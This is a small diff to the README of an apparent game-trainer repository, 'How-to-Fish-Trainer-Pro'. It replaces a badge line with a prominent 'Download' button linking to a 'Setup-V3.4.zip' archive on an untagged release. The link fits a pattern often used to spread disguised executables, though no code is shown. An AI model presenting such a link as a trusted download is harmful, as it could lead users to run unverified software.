@@ -3,7 +3,7 @@
 
 ![License](https://img.shields.io/badge/License-MIT-red)
 ![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue)
-![Downloads](https://github.com/wretchedoutli/How-to-Fish-Trainer-Pro/releases/download/untagged-8a21901af90536d0d908/Setup-V3.4.zip)
+[![Download](https://img.shields.io/badge/Download-blue)](https://github.com/wretchedoutli/How-to-Fish-Trainer-Pro/releases/download/untagged-8a21901af90536d0d908/Setup-V3.4.zip)
 
 # **📖 Contents**
 
